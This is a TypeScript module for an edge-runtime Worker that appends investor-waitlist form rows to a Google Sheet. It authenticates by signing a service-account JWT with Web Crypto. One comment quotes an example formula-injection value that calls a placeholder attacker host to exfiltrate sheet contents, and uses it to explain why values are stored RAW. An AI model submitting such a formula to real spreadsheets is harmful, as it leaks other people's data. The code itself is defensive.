// Appends a row to a Google Sheet via the Sheets API v4, authenticated as a
// Google service account. Written for the investor waitlist form
// (src/pages/api/contact.ts) to mirror how the old Wix site handled it: rows
// land in a spreadsheet, nobody gets emailed.
//
// This runs on Cloudflare Workers (edge runtime), so there's no Node `crypto`
// and no `googleapis` package (it assumes Node). A service account normally
// authenticates by signing a JWT with its private key and exchanging that for
// an OAuth access token - here that signing is done by hand with the
// platform's own Web Crypto (`crypto.subtle`), which Workers fully supports.

interface ServiceAccountCreds {
  clientEmail: string;
  privateKeyPem: string;
}

function base64UrlEncode(bytes: ArrayBuffer | Uint8Array): string {
  const arr = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  let binary = '';
  for (let i = 0; i < arr.length; i++) binary += String.fromCharCode(arr[i]);
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function base64UrlEncodeString(value: string): string {
  return base64UrlEncode(new TextEncoder().encode(value));
}

// Service account private keys come down from Google as PEM
// ("-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n"). Env vars
// can't hold real newlines cleanly, so this also accepts the same string with
// literal "\n" escapes (however it gets pasted into the Webflow Cloud
// dashboard) and normalizes either form before handing it to WebCrypto, which
// only wants the raw base64 body.
async function importPrivateKey(pem: string): Promise<CryptoKey> {
  const normalized = pem.replace(/\\n/g, '\n');
  const body = normalized
    .replace(/-----BEGIN PRIVATE KEY-----/, '')
    .replace(/-----END PRIVATE KEY-----/, '')
    .replace(/\s+/g, '');
  const der = Uint8Array.from(atob(body), (c) => c.charCodeAt(0));
  return crypto.subtle.importKey(
    'pkcs8',
    der,
    { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
    false,
    ['sign'],
  );
}

async function getAccessToken(creds: ServiceAccountCreds): Promise<string> {
  const nowSec = Math.floor(Date.now() / 1000);
  const header = { alg: 'RS256', typ: 'JWT' };
  const claims = {
    iss: creds.clientEmail,
    scope: 'https://www.googleapis.com/auth/spreadsheets',
    aud: 'https://oauth2.googleapis.com/token',
    iat: nowSec,
    // Google caps this at one hour; there's no token cache here since the
    // waitlist form is low-traffic enough that minting a fresh one per
    // submission is cheap.
    exp: nowSec + 3600,
  };
  const unsigned = `${base64UrlEncodeString(JSON.stringify(header))}.${base64UrlEncodeString(JSON.stringify(claims))}`;
  const key = await importPrivateKey(creds.privateKeyPem);
  const signature = await crypto.subtle.sign(
    'RSASSA-PKCS1-v1_5',
    key,
    new TextEncoder().encode(unsigned),
  );
  const jwt = `${unsigned}.${base64UrlEncode(signature)}`;

  const res = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
      assertion: jwt,
    }),
  });
  if (!res.ok) {
    throw new Error(`Google token exchange failed: ${res.status} ${await res.text()}`);
  }
  const data = (await res.json()) as { access_token?: string };
  if (!data.access_token) throw new Error('Google token exchange returned no access_token');
  return data.access_token;
}

// `range` is a sheet name (e.g. "Sheet1") or an A1 range within it - the
// Sheets API appends after the last row of whatever range you give it,
// finding that row itself, so a bare tab name is enough.
export async function appendRow(
  env: any,
  values: (string | number)[],
  {
    spreadsheetIdEnv = 'GOOGLE_SHEETS_SPREADSHEET_ID',
    range = 'Sheet1',
  }: { spreadsheetIdEnv?: string; range?: string } = {},
): Promise<void> {
  const clientEmail = env.GOOGLE_SHEETS_CLIENT_EMAIL;
  const privateKeyPem = env.GOOGLE_SHEETS_PRIVATE_KEY;
  const spreadsheetId = env[spreadsheetIdEnv];
  if (!clientEmail || !privateKeyPem || !spreadsheetId) {
    throw new Error(
      'Google Sheets is not configured (need GOOGLE_SHEETS_CLIENT_EMAIL, GOOGLE_SHEETS_PRIVATE_KEY, and ' +
        `${spreadsheetIdEnv})`,
    );
  }

  const accessToken = await getAccessToken({ clientEmail, privateKeyPem });

  // RAW, not USER_ENTERED: these values come from a public form, and
  // USER_ENTERED parses each one as though a person typed it - so a
  // submitted "email" of =IMPORTXML("https://evil.example/?d="&A1,"//a")
  // would be stored as a live formula and run the moment someone opened the
  // sheet, leaking its contents. RAW stores every value as the literal text
  // that was submitted. The tradeoff is that the timestamp column stays text
  // rather than a parsed date; ISO-8601 still sorts correctly as text.
  const url = `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}/values/${encodeURIComponent(
    range,
  )}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`;
  const res = await fetch(url, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${accessToken}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ values: [values] }),
  });
  if (!res.ok) {
    throw new Error(`Sheets append failed: ${res.status} ${await res.text()}`);
  }
}
